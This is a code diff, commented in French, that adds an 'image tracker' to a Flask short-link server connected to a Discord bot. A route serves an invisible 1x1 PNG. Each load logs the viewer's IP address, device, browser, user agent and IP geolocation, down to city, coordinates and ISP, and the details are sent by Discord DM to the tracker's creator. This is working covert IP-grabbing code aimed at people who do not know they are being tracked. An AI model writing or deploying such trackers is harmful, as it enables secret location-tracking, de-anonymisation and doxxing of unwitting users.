@@ -1,5 +1,5 @@
 import sqlite3
-from flask import Flask, request, redirect, render_template_string, session, url_for
+from flask import Flask, request, redirect, render_template_string, session, url_for, send_file
 from flask_session import Session
 from datetime import datetime
 from user_agents import parse
@@ -13,6 +13,8 @@ import string
 import random
 import base64
 import secrets
+from PIL import Image
+import io
 
 load_dotenv()
 BASE_URL = os.getenv('BASE_URL', 'https://bot-finish-production.up.railway.app')
@@ -60,6 +62,35 @@ def init_shortlink_db():
             FOREIGN KEY(short_id) REFERENCES custom_links(id)
         )
     ''')
+    
+    # Tables pour les images tracker
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS image_trackers (
+            id TEXT PRIMARY KEY,
+            user_id INTEGER NOT NULL,
+            guild_id INTEGER NOT NULL,
+            title TEXT NOT NULL,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            clicks INTEGER DEFAULT 0
+        )
+    ''')
+    
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS image_clicks (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            tracker_id TEXT NOT NULL,
+            ip_address TEXT,
+            browser TEXT,
+            device_type TEXT,
+            country TEXT,
+            region TEXT,
+            city TEXT,
+            user_agent TEXT,
+            clicked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            FOREIGN KEY(tracker_id) REFERENCES image_trackers(id)
+        )
+    ''')
+    
     conn.commit()
     conn.close()
 
@@ -101,7 +132,65 @@ def get_ip_info(ip_address):
     except:
         pass
     
-    return None
+    return {
+        'country': 'Inconnu',
+        'country_code': 'XX',
+        'region': 'Inconnu',
+        'city': 'Inconnu',
+        'isp': 'Inconnu',
+        'org': 'Inconnu',
+        'lat': 'N/A',
+        'lon': 'N/A',
+        'timezone': 'Inconnu'
+    }
+
+async def notify_discord_image_click(user_id, tracker_id, ip_address, browser, device_type, user_agent_str):
+    """Notifier l'utilisateur qu'une image a été cliquée"""
+    if not bot_instance:
+        return
+    
+    try:
+        creator = await bot_instance.fetch_user(user_id)
+        user_agent_obj = parse(user_agent_str)
+        os_info = get_os_info(user_agent_str)
+        ip_info = get_ip_info(ip_address)
+        
+        embed = discord.Embed(
+            title="🖼️ Quelqu'un a cliqué sur votre image !",
+            description=f"L'image tracker **{tracker_id}** a été cliquée",
+            color=discord.Color.red(),
+            timestamp=datetime.now()
+        )
+        
+        embed.add_field(name="🆔 ID Tracker", value=f"`{tracker_id}`", inline=False)
+        
+        embed.add_field(name="💻 INFORMATIONS SYSTÈME", value="‎", inline=False)
+        embed.add_field(name="Appareil", value=f"📱 {device_type}", inline=True)
+        embed.add_field(name="Système", value=os_info, inline=True)
+        embed.add_field(name="Navigateur", value=f"🌐 {browser}", inline=True)
+        
+        embed.add_field(name="🌍 INFORMATIONS RÉSEAU", value="‎", inline=False)
+        embed.add_field(name="Adresse IP", value=f"```{ip_address}```", inline=False)
+        
+        if ip_info:
+            embed.add_field(name="🗺️ Géolocalisation", value="‎", inline=False)
+            embed.add_field(name="Pays", value=f"🌐 {ip_info['country']}", inline=True)
+            embed.add_field(name="Région", value=f"📍 {ip_info['region']}", inline=True)
+            embed.add_field(name="Ville", value=f"🏙️ {ip_info['city']}", inline=True)
+            embed.add_field(name="Fuseau horaire", value=f"🕐 {ip_info['timezone']}", inline=True)
+            embed.add_field(name="Coordonnées", value=f"📌 {ip_info['lat']}, {ip_info['lon']}", inline=True)
+            embed.add_field(name="FAI", value=f"🔗 {ip_info['isp']}", inline=True)
+        
+        embed.add_field(name="📋 DÉTAILS TECHNIQUES", value="‎", inline=False)
+        embed.add_field(name="User-Agent", value=f"```{user_agent_str[:120]}```", inline=False)
+        
+        embed.add_field(name="⏰ Heure du clic", value=datetime.now().strftime("%d/%m/%Y à %H:%M:%S"), inline=False)
+        
+        embed.set_footer(text="Image Tracker | Détection de clic")
+        
+        await creator.send(embed=embed)
+    except Exception as e:
+        print(f"Erreur notification image: {e}")
 
 async def notify_discord_shortlink(creator_id, short_id, ip_address, browser, device_type, user_agent_str):
     if not bot_instance:
@@ -224,7 +313,92 @@ def record_visit(short_id, visitor_id, visitor_name, ip_address, browser, device
 
 @app.route('/')
 def home():
-    return "✅ Serveur de liens courts actif!", 200
+    return "✅ Serveur de liens courts et images tracker actif!", 200
+
+@app.route('/image/<tracker_id>')
+def image_tracker(tracker_id):
+    """Route pour les images tracker"""
+    user_agent_str = request.headers.get('User-Agent', 'Unknown')
+    user_agent_obj = parse(user_agent_str)
+    
+    device_type = 'Mobile' if user_agent_obj.is_mobile else ('Tablet' if user_agent_obj.is_tablet else 'Desktop')
+    browser = str(user_agent_obj.browser.family)
+    
+    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ',' in ip_address:
+        ip_address = ip_address.split(',')[0].strip()
+    
+    conn = sqlite3.connect("links.db")
+    cursor = conn.cursor()
+    
+    # Récupérer les infos du tracker
+    cursor.execute('''
+        SELECT user_id, title, clicks
+        FROM image_trackers
+        WHERE id = ?
+    ''', (tracker_id,))
+    
+    result = cursor.fetchone()
+    
+    if result:
+        user_id, title, clicks = result
+        
+        # Incrémenter le compteur
+        cursor.execute('''
+            UPDATE image_trackers
+            SET clicks = clicks + 1
+            WHERE id = ?
+        ''', (tracker_id,))
+        
+        # Obtenir les infos de localisation
+        ip_info = get_ip_info(ip_address)
+        
+        # Enregistrer le clic
+        cursor.execute('''
+            INSERT INTO image_clicks (tracker_id, ip_address, browser, device_type, country, region, city, user_agent)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            tracker_id, 
+            ip_address, 
+            browser, 
+            device_type,
+            ip_info['country'],
+            ip_info['region'],
+            ip_info['city'],
+            user_agent_str
+        ))
+        
+        conn.commit()
+        conn.close()
+        
+        # Notifier Discord
+        if bot_instance:
+            try:
+                loop = bot_instance.loop
+                asyncio.run_coroutine_threadsafe(
+                    notify_discord_image_click(
+                        user_id,
+                        tracker_id,
+                        ip_address,
+                        browser,
+                        device_type,
+                        user_agent_str
+                    ),
+                    loop
+                )
+            except Exception as e:
+                print(f"Erreur notification: {e}")
+        
+        # Créer et retourner une image transparente (pixel tracker)
+        img = Image.new('RGBA', (1, 1), (0, 0, 0, 0))
+        img_bytes = io.BytesIO()
+        img.save(img_bytes, format='PNG')
+        img_bytes.seek(0)
+        
+        return send_file(img_bytes, mimetype='image/png')
+    
+    conn.close()
+    return "Tracker non trouvé", 404
 
 @app.route('/auth/callback')
 def auth_callback():
